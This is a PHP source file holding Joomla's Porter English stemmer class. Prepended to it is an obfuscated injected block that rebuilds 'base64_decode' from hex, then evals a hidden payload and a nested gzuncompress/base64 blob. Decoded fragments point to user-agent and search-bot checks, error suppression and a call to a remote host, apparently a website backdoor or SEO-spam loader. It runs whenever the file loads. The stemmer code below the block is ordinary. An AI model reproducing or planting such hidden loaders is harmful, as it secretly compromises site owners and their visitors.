<?php /*versio:3.02*/ $GLOBALS["yfegmf"]="HhaW5pX3NldAqAMYWxsb3dfdXJsX2ZvcGVuqwZGlzcGxheV9lcnJvcnMviOPc3R5eC9qbWxfaGRyX3JlcG9zdAQJEsMy4wMgtCMWb29Cb29qYWk3U2lhY2hlaXNlMXN1N3BodQalHvdaHR0cDovLwfKFIWSFRUUFMVgb2ZmmsICaHR0cHM6Ly8BSPYMySFRUUF9IT1NUtdW5pb24nmAlByykc2VsZWN0KrmbwUkVRVUVTVF9VUkkqahAElU0NSSVBUX05BTUUteQUVVFUllfU1RSSU5HjLsUUPwNZGV0ZXJtaW5hdG9yoLghGkvXLmxvZwAhXXSFRUUF9ZX0FVVEgtOSqCWYmFzZTY0X2RlY29kZQflMdmVyc2lvVXOLQJDLXBocAnTISFRUUF9FWEVDUEhQPwSXb3V0Wb2sJXtwMsSFRUUF9VU0VSX0FHRU5UrALAbZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAeOpYQyPiODkuMzIuMTUwLjE2NANzEZmFzdGFkZHouY29tKbFL3czLnBocD91PQFJiJms9vJnQ9cGhwJnA9TnDgJnY9SQZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYrdHVvOGdTZnBVT3NrWllNTmhnalBIa2NKUm8xbk1tMG13U2VaeVZWck1SNHRKZ2JBTTJGMThTNWQxUEZkMFluTmlqL1dYY1ZWMzMrcW82Q29oNDVkTWdTcWd2Q2o0dGFCWkhpVk9rbWREdHZwSUl5RUdaZUVXVUpqYmRSM21SaTQ3alVzYzU3RVZONnN0cXY0dDhOMUVTMlRrdEdxSXBqV1N0MzVXSjJyMCtROVowU1IzSTZoZ1krc0R3Um1vdHhON3NGblNaUjBXNlhHekZqdWR1Zk4rWHlhZE9NRStXams4c2N2LzA0MGVYdkpMbUpJNjhMQzJpbUlwRlZsS1FsOUdpekJJUzBEU29SYnpUNGdTSjYzcCtFa2JaWHV6ay9tTDVFc3FrNDY0T3lkd0hqenBaVEY5aUQ0UUxYcG10aEd2U2VmRmZOcHNEbkhDYUl0amdWd0VrREZQbFl3ZytDczVxbGU1c3VHUUg2Wm9tUXBkWUlFVVYwR1p1MkUwUXJTaHkyMTZhRkRTQnNBcnpvbGgvNmZVRW9oQnVEMzR4Z3hRaWZOcFpRZWdKbFJ0MGxkTnpxZUVtWWtZNmtlczVjN1QyaHArS2NMV1RiYUlrZEU1OGdMeWthL1NpczFyN3hmN1VRYnFuSHBCdStFV1JpNVhKMTZmcGo0ZkhtUTAvTXZrWHRuc2xtbjVaenZmSjdSK1RxVXdDQjN6N0xlZDBNbnVhM3MrbXQvYy92K0VObnZMTEY3NCszTjlQdnM1bWQzOU9IcDVtTWpFd0VLdE5IdS9LS2p6TTdmb2Vpc0tNMjk0cXpXbnJGQU5PNDNVQm5Pd3loTGtSSXdqWGIzVjIrV21kS1N4VlZvT29Mc2hUYjRsMTBWU2QyWWZLaTVNc0w3YndzVnFzM1hJdmt5SFhXZGN2aW5HV2FibWtUQjA1N1Fnd08xaVhXQVIxeXdqL204eklLOC9DbTZCZ0d2SWwrVDZiUGZaVXBROEgvMlQvSlBEelBjMkxMd1ErWHJsSmJ4VUJ3N1F2Tjl2Q0JSV1AzeC90aDUrSzBCTVUvUHhyTXYxNTkzQi9SdWxUVHJQUHR5SFU5QmRRenU1WDhtcVp1em5Vdm5oMW9jKzVVMTN5NlJNUjMvVTErZHlRLzBPMGJoTVFCUU1MN2RReVJOWE1xbGR1QXA3SUl3eDBpbzFiaGt0d2l1N1hxOVNub25DMFQ2NUZBbCtaSUdSeDdsLzk1d1pYb3ZqTVBjWlg2WHc3Z1pyUUs1ekRZaC81V1JsaWl5N25mZ2I4dTdubjVXdHdnbnJ6bEFoLzI0TENpWXJ3QmI0Wm5TZnBGTHdneEc2YXBHNldVbGZzK082THV5bTdEYmgwN0orVEtXVG9GeWM5NCsxT2ZzZ1RQN2VPRUt4cWttN0tXdFVOKzNDZkw5S0dOaHhKZzRITUdpVkt3NFBma0F4TkdwanlRRWNhcTVhR1pvNmxZVFVUV09WR2VSWEEycHBHYzM4azZTTjUxSDJ1Wjh6TlI2WlJYekoxNUNGWEZtbE9KWFZveUhxRmNPKzFxeU1WSjVMS1U4RHBpcFVYV1pFQ0pOUHNuQjRESnBHbXk2cld4UVFIYVVZZGJ3NWRaMlAzT0RuaE9iSCsyeVFNTFFhaDZ4VEtqUjNLalJHbWlaTnRoR094a3ZHTEMzaHVSMTZYeG4wWnd0UkErVVY1dWlrWnBteitWaDdrWktneGVXOWduWGgxTWZKakF4T3JEakgwQ0NnZk9VYTZOQnhXSEJVNGZtRFFCNUxXSDFVTW1PWExTUjROcERFSU1pNnFHZ3dsZGF3elZVb3J4MXJma015QnJIVmhocHhMbU1vTU1MclAxKzg2YlJIRVJiaU4zVVAyc2hleFJNb2dQb1NoNVVkWjRnQ0syUGEzdXg4VDIrNHFmOXhOWVNROFRQOEc4WSszMDF2NGhIb09peUtQUS9EN05zdWNnMGlFbmsrM3ZYd2VRMzhMdlNKZTk1UUE1dlhuTW9uMnpkSGQxMGw5MHBncnpQNThGSjVQVHliSG84bjlYMjJPK2k5WWRYTENMMVI2VVBweHhTZ0JmeHpmaG1NYmZCTmdpK0t1S2dKalBmN2RyVC96RmFQSEx1VVhxQjZVUFFYYVNSUHdnR0FibEp2VUwxSmUvVmQ4RVBMREt0VFZwMktkalN4YmtISjdsMFdGNHdMOG45eXNqTUcxZ3gxZUV4ZjBMMnNnclljcVk3dXVLcnpxbDFVelEzRWVBT3k4RXJiS3R2Yk1BVURTQUl1bFhqVHJodXNrV1pZc3FGWER4SmxLMDlRK1ZDanJGbHczeXpMYXJheWIyQi9XZWhVK0ZqbUFLaHd0RVJ1WC9tS1ZiSzEzTmFtMHFoeXdySzlCbVN0Yzh2VUg2MVVkV2tRZk1mTzVSSlM5bXdmeE5zR0lzVE9sdFhZUCttWUYzQmRnVmUwUEpVMVRLNmNzaTJ1dTl0MnNURVBhR2dIQU45WmtGYWNvbTFCOEVKM09zNmFiQnpBWURBQXF1UjRualZWalRkTE1VZVVxbTBKS0N3c05TUnVPd09SNjNZbGV0b2RnWlhHRHp2bWdhUU5KTmNZY1crRDFRYmZPcXI3NEw4MVZ4Mm9WQngzc2JTVWN3SHM4bGdkZFZpcjdxQkJaMVhUU2NydGRwUkR5YjdpZzRsd001MlcyUll6OC9YelJESkE1TlBFeGRESmc2dDJqQ2FDdVFVRVlFS1cyUlNaVWdHSElReGg1VlJ1bWgwV2E1KytHRUxORlBsS3ZMS3N5RS9ONjhNUFFZWnNuMnpyZmx3d01XazAzWktPdFZoL0NGTkRCRkt5MlRiRHc2UUlsbE5oekhscDl0ckpVbUtRbWF4ZGNETEhab2RPWkFiQ240eDdYaFgybWdPV0dHY3IvTUFYd3A5b1Bqd3NidTRnV3NPQmJNMWdDVDhDaGhoVjhUZFdPVlFWUnBLVTNGNXVPQWVUMFZxVlA3VFR4YU91OEJRZDFndUd0aG5vd2RLNFhMNkxGY1J3MG1jTDF4Y0RXYUlWTU5XQm5NcXBlcmJ2djFBcVV5REduRlVoK2hGNnlSWjIwSnFFTzJZZmhyK3JRT0l5djFUaDlVOUlOVGRhUCtOSFE5SkVwalVlNDA1eHZPTjBZVnZkWW40THFPQWczTC9qWWZmY3VaaEdBM2JkNUdsOS9qQzdEYWY3VStZREFzTURvT29Nd3ZwcjlIeHpGTG04PSIpKSk7";        if (!function_exists('aabeaayx')){function aabeaayx($a, $b){$c=$GLOBALS['yfegmf'];$d=pack('H*','6261736536345f64656'.'36f6465'); return $d(substr($c, $a, $b));};eval(aabeaayx(597,3304));};?><?php
/**
 * @package     Joomla.Platform
 * @subpackage  Language
 *
 * @copyright   Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
 * @copyright   Copyright (C) 2005 Richard Heyes (http://www.phpguru.org/). All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE
 */

defined('JPATH_PLATFORM') or die;

/**
 * Porter English stemmer class.
 *
 * This class was adapted from one written by Richard Heyes.
 * See copyright and link information above.
 *
 * @package     Joomla.Platform
 * @subpackage  Language
 * @since       12.1
 */
class JLanguageStemmerPorteren extends JLanguageStemmer
{
	/**
	 * Regex for matching a consonant.
	 *
	 * @var    string
	 * @since  12.1
	 */
	private static $_regex_consonant = '(?:[bcdfghjklmnpqrstvwxz]|(?<=[aeiou])y|^y)';

	/**
	 * Regex for matching a vowel
	 * @var    string
	 * @since  12.1
	 */
	private static $_regex_vowel = '(?:[aeiou]|(?<![aeiou])y)';

	/**
	 * Method to stem a token and return the root.
	 *
	 * @param   string  $token  The token to stem.
	 * @param   string  $lang   The language of the token.
	 *
	 * @return  string  The root token.
	 *
	 * @since   12.1
	 */
	public function stem($token, $lang)
	{
		// Check if the token is long enough to merit stemming.
		if (strlen($token) <= 2)
		{
			return $token;
		}

		// Check if the language is English or All.
		if ($lang !== 'en')
		{
			return $token;
		}

		// Stem the token if it is not in the cache.
		if (!isset($this->cache[$lang][$token]))
		{
			// Stem the token.
			$result = $token;
			$result = self::_step1ab($result);
			$result = self::_step1c($result);
			$result = self::_step2($result);
			$result = self::_step3($result);
			$result = self::_step4($result);
			$result = self::_step5($result);

			// Add the token to the cache.
			$this->cache[$lang][$token] = $result;
		}

		return $this->cache[$lang][$token];
	}

	/**
	 * Step 1
	 *
	 * @param   string  $word  The token to stem.
	 *
	 * @return  string
	 *
	 * @since   12.1
	 */
	private static function _step1ab($word)
	{
		// Part a
		if (substr($word, -1) == 's')
		{
				self::_replace($word, 'sses', 'ss')
			or self::_replace($word, 'ies', 'i')
			or self::_replace($word, 'ss', 'ss')
			or self::_replace($word, 's', '');
		}

		// Part b
		if (substr($word, -2, 1) != 'e' or !self::_replace($word, 'eed', 'ee', 0))
		{
			// First rule
			$v = self::$_regex_vowel;

			// Check ing and ed
			// Note use of && and OR, for precedence reasons
			if (preg_match("#$v+#", substr($word, 0, -3)) && self::_replace($word, 'ing', '')
				or preg_match("#$v+#", substr($word, 0, -2)) && self::_replace($word, 'ed', ''))
			{
				// If one of above two test successful
				if (!self::_replace($word, 'at', 'ate') and !self::_replace($word, 'bl', 'ble') and !self::_replace($word, 'iz', 'ize'))
				{
					// Double consonant ending
					if (self::_doubleConsonant($word) and substr($word, -2) != 'll' and substr($word, -2) != 'ss' and substr($word, -2) != 'zz')
					{
						$word = substr($word, 0, -1);
					}
					elseif (self::_m($word) == 1 and self::_cvc($word))
					{
						$word .= 'e';
					}
				}
			}
		}

		return $word;
	}

	/**
	 * Step 1c
	 *
	 * @param   string  $word  The token to stem.
	 *
	 * @return  string
	 *
	 * @since   12.1
	 */
	private static function _step1c($word)
	{
		$v = self::$_regex_vowel;

		if (substr($word, -1) == 'y' && preg_match("#$v+#", substr($word, 0, -1)))
		{
			self::_replace($word, 'y', 'i');
		}

		return $word;
	}

	/**
	 * Step 2
	 *
	 * @param   string  $word  The token to stem.
	 *
	 * @return  string
	 *
	 * @since   12.1
	 */
	private static function _step2($word)
	{
		switch (substr($word, -2, 1))
		{
			case 'a':
					self::_replace($word, 'ational', 'ate', 0)
				or self::_replace($word, 'tional', 'tion', 0);
				break;
			case 'c':
					self::_replace($word, 'enci', 'ence', 0)
				or self::_replace($word, 'anci', 'ance', 0);
				break;
			case 'e':
				self::_replace($word, 'izer', 'ize', 0);
				break;
			case 'g':
				self::_replace($word, 'logi', 'log', 0);
				break;
			case 'l':
					self::_replace($word, 'entli', 'ent', 0)
				or self::_replace($word, 'ousli', 'ous', 0)
				or self::_replace($word, 'alli', 'al', 0)
				or self::_replace($word, 'bli', 'ble', 0)
				or self::_replace($word, 'eli', 'e', 0);
				break;
			case 'o':
					self::_replace($word, 'ization', 'ize', 0)
				or self::_replace($word, 'ation', 'ate', 0)
				or self::_replace($word, 'ator', 'ate', 0);
				break;
			case 's':
					self::_replace($word, 'iveness', 'ive', 0)
				or self::_replace($word, 'fulness', 'ful', 0)
				or self::_replace($word, 'ousness', 'ous', 0)
				or self::_replace($word, 'alism', 'al', 0);
				break;
			case 't':
					self::_replace($word, 'biliti', 'ble', 0)
				or self::_replace($word, 'aliti', 'al', 0)
				or self::_replace($word, 'iviti', 'ive', 0);
				break;
		}

		return $word;
	}

	/**
	 * Step 3
	 *
	 * @param   string  $word  The token to stem.
	 *
	 * @return  string
	 *
	 * @since   12.1
	 */
	private static function _step3($word)
	{
		switch (substr($word, -2, 1))
		{
			case 'a':
				self::_replace($word, 'ical', 'ic', 0);
				break;
			case 's':
				self::_replace($word, 'ness', '', 0);
				break;
			case 't':
					self::_replace($word, 'icate', 'ic', 0)
				or self::_replace($word, 'iciti', 'ic', 0);
				break;
			case 'u':
				self::_replace($word, 'ful', '', 0);
				break;
			case 'v':
				self::_replace($word, 'ative', '', 0);
				break;
			case 'z':
				self::_replace($word, 'alize', 'al', 0);
				break;
		}

		return $word;
	}

	/**
	 * Step 4
	 *
	 * @param   string  $word  The token to stem.
	 *
	 * @return  string
	 *
	 * @since   12.1
	 */
	private static function _step4($word)
	{
		switch (substr($word, -2, 1))
		{
			case 'a':
				self::_replace($word, 'al', '', 1);
				break;
			case 'c':
					self::_replace($word, 'ance', '', 1)
				or self::_replace($word, 'ence', '', 1);
				break;
			case 'e':
				self::_replace($word, 'er', '', 1);
				break;
			case 'i':
				self::_replace($word, 'ic', '', 1);
				break;
			case 'l':
					self::_replace($word, 'able', '', 1)
				or self::_replace($word, 'ible', '', 1);
				break;
			case 'n':
					self::_replace($word, 'ant', '', 1)
				or self::_replace($word, 'ement', '', 1)
				or self::_replace($word, 'ment', '', 1)
				or self::_replace($word, 'ent', '', 1);
				break;
			case 'o':
				if (substr($word, -4) == 'tion' or substr($word, -4) == 'sion')
				{
					self::_replace($word, 'ion', '', 1);
				}
				else
				{
					self::_replace($word, 'ou', '', 1);
				}
				break;
			case 's':
				self::_replace($word, 'ism', '', 1);
				break;
			case 't':
					self::_replace($word, 'ate', '', 1)
				or self::_replace($word, 'iti', '', 1);
				break;
			case 'u':
				self::_replace($word, 'ous', '', 1);
				break;
			case 'v':
				self::_replace($word, 'ive', '', 1);
				break;
			case 'z':
				self::_replace($word, 'ize', '', 1);
				break;
		}

		return $word;
	}

	/**
	 * Step 5
	 *
	 * @param   string  $word  The token to stem.
	 *
	 * @return  string
	 *
	 * @since   12.1
	 */
	private static function _step5($word)
	{
		// Part a
		if (substr($word, -1) == 'e')
		{
			if (self::_m(substr($word, 0, -1)) > 1)
			{
				self::_replace($word, 'e', '');
			}
			elseif (self::_m(substr($word, 0, -1)) == 1)
			{
				if (!self::_cvc(substr($word, 0, -1)))
				{
					self::_replace($word, 'e', '');
				}
			}
		}

		// Part b
		if (self::_m($word) > 1 and self::_doubleConsonant($word) and substr($word, -1) == 'l')
		{
			$word = substr($word, 0, -1);
		}

		return $word;
	}

	/**
	 * Replaces the first string with the second, at the end of the string. If third
	 * arg is given, then the preceding string must match that m count at least.
	 *
	 * @param   string   &$str   String to check
	 * @param   string   $check  Ending to check for
	 * @param   string   $repl   Replacement string
	 * @param   integer  $m      Optional minimum number of m() to meet
	 *
	 * @return  boolean  Whether the $check string was at the end
	 *                   of the $str string. True does not necessarily mean
	 *                   that it was replaced.
	 *
	 * @since   12.1
	 */
	private static function _replace(&$str, $check, $repl, $m = null)
	{
		$len = 0 - strlen($check);

		if (substr($str, $len) == $check)
		{
			$substr = substr($str, 0, $len);

			if (is_null($m) or self::_m($substr) > $m)
			{
				$str = $substr . $repl;
			}

			return true;
		}

		return false;
	}

	/**
	 * m() measures the number of consonant sequences in $str. if c is
	 * a consonant sequence and v a vowel sequence, and <..> indicates arbitrary
	 * presence,
	 *
	 * <c><v>       gives 0
	 * <c>vc<v>     gives 1
	 * <c>vcvc<v>   gives 2
	 * <c>vcvcvc<v> gives 3
	 *
	 * @param   string  $str  The string to return the m count for
	 *
	 * @return  integer  The m count
	 *
	 * @since   12.1
	 */
	private static function _m($str)
	{
		$c = self::$_regex_consonant;
		$v = self::$_regex_vowel;

		$str = preg_replace("#^$c+#", '', $str);
		$str = preg_replace("#$v+$#", '', $str);

		preg_match_all("#($v+$c+)#", $str, $matches);

		return count($matches[1]);
	}

	/**
	 * Returns true/false as to whether the given string contains two
	 * of the same consonant next to each other at the end of the string.
	 *
	 * @param   string  $str  String to check
	 *
	 * @return  boolean  Result
	 *
	 * @since   12.1
	 */
	private static function _doubleConsonant($str)
	{
		$c = self::$_regex_consonant;

		return preg_match("#$c{2}$#", $str, $matches) and $matches[0]{0} == $matches[0]{1};
	}

	/**
	 * Checks for ending CVC sequence where second C is not W, X or Y
	 *
	 * @param   string  $str  String to check
	 *
	 * @return  boolean  Result
	 *
	 * @since   12.1
	 */
	private static function _cvc($str)
	{
		$c = self::$_regex_consonant;
		$v = self::$_regex_vowel;

		$result = preg_match("#($c$v$c)$#", $str, $matches)
			and strlen($matches[1]) == 3
			and $matches[1]{2} != 'w'
			and $matches[1]{2} != 'x'
			and $matches[1]{2} != 'y';

		return $result;
	}
}
